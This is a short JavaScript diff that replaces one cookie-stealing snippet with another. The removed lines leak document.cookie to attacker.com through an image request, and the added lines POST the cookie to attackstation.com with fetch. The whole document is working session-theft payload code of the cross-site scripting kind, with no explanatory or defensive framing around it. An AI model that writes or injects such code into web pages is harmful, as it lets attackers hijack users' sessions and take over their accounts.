@@ -1,2 +1,4 @@
-var i = new Image();
-i.src = "http://attacker.com/capture?data=" + encodeURIComponent(document.cookie);
+fetch("http://attackstation.com/capture", {
+  method: "POST",
+  body: JSON.stringify({cookie: document.cookie})
+});
